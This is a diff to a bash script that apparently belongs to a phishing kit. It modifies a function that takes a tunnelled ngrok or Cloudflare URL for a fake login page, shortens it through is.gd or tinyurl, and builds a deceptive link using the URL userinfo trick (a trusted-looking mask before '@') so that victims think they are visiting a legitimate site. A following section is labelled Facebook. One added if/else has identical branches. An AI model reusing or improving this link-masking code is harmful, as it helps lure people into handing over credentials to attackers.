@@ -650,7 +650,6 @@ site_stat() { [[ ${1} != "" ]] && curl -s -o /dev/null -w "%{http_code}" "${1}";
 
 shorten() {
 	short=$(curl --silent --insecure --fail --retry 2 --retry-delay 2 "$1$2")
-	# processed_url=$(echo "$short" | awk -F// '{print $NF}')
 	processed_url=${short#http*//}
 }
 
@@ -662,31 +661,39 @@ custom_url() {
 
 	{ custom_mask; sleep 1; clear; banner_small; }
 	if [[ ${url} =~ trycloudflare\.com$ ]] || [[ ${url} =~ ngrok\.io$ ]] || [[ ${url} =~ ngrok-free\.app$ ]] || [[ ${url} =~ ngrok\.app$ ]]; then
-		# Try is.gd first, then tinyurl as fallback
+		# Try is.gd first, then tinyurl as fallback (pass full URL with https://)
 		if [[ $(site_stat "$isgd") == 2* ]]; then
-			shorten "$isgd" "$url"
+			shorten "$isgd" "https://$url"
 		elif [[ $(site_stat "$tinyurl") == 2* ]]; then
-			shorten "$tinyurl" "$url"
+			shorten "$tinyurl" "https://$url"
 		else
-			# Both shorteners unavailable, use original URL
+			# Both shorteners unavailable, use original domain
 			processed_url="$url"
 		fi
 
-		# Strip protocol from mask for userinfo component
+		# Build masked URL using userinfo trick
 		mask_clean="${mask#https://}"
 		mask_clean="${mask_clean#http://}"
 		url="https://$url"
-		masked_url="https://$mask_clean@$processed_url"
+
+		# If we got a shortened URL, mask looks cleaner
+		if [[ "$processed_url" != "$url" ]] && [[ "$processed_url" != "${url#https://}" ]]; then
+			masked_url="https://$mask_clean@$processed_url"
+		else
+			masked_url="https://$mask_clean@$processed_url"
+		fi
 		processed_url="https://$processed_url"
 	else
-		# echo "[!] No url provided / Regex Not Matched"
 		url="Unable to generate links. Try after turning on hotspot"
 		processed_url="Unable to Short URL"
 	fi
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+	if [[ $processed_url != *"Unable"* ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 ${RED}[${CYAN}Mask URL${RED}] : ${GREEN}$mask"
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 4 ${RED}[${CYAN}Direct Link${RED}] : ${ORANGE}$masked_url"
+	fi
 }
 
 ## Facebook
